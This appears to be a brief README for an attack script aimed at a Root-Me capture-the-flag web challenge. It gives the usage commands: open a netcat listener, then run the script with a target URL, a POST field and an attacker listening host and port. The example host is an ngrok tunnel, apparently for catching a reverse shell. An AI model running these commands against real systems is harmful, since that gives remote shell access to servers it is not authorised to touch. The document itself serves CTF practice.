How to use ?

You must open a netcat listener before : nc -lvp Your listening port

Then launch :
python3 main.py -u url -d post_variable -lhost Your listening ip -lport Your listening port

Example : python main.py -u http://challenge01.root-me.org/web-serveur/ch41/check -d nickname -lhost 2.tcp.ngrok.io -lport 11598

